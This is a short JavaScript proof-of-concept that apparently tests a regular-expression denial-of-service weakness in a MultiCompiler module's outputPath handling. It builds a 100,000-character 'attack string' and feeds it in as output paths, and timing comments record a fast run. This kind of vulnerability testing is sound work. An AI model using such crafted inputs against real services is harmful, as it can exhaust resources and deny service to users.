const MultiCompiler = require("./MultiCompiler.js");

//Attack String :""+"a"*100000+"/"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "/";

const compiler1 = {
  outputPath: "\\" + str,
};
const compiler2 = {
  outputPath: str,
};
var myObj = new MultiCompiler([compiler1, compiler2], "");
var result = myObj.outputPath;

// real    0m0.118s
// user    0m0.092s
// sys     0m0.010s
